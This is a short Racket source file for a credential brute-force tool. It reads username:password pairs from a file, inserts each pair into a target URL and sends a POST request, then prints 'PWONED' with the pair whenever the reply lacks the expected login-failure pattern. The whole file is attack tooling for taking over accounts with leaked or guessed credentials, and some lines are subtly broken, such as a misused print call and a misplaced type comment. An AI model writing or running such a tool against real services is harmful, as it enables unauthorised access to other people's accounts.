#lang racket

(require net/url)
(provide force-it!)


;; get-credentials-list : string -> list or false
(define (force-it! url file-location pattern passwd-first?)
  (with-input-from-file file-location
    (λ ()
       (let loop ([line (read-line)])
         (when (not (eof-object? line))
           (let ([credentials (get-credentials-list line passwd-first?)])
             (when credentials
               (displayln "trying ~a with cretendials ~a" url credentials)
               (let ([post-return
                      (post-pure-port
                       (string->url
                        (format url (first credentials) (second credentials)))
                       #"")])
                 (when (not (regexp-match? pattern post-return))
                   (displayln "PWONED")
                   (displayln credentials)))))
           (loop (read-line)))))))

(define (get-credentials-list line passwd-first?)
  (let ([credentials (regexp-split ":" line)])
    (if passwd-first?
        (if (and (> (length credentials) 1)
                 (> (string-length (second credentials)) 0))
            (list (second credentials) (first credentials))
            #f)
        (list (first credentials) (second credentials)))))



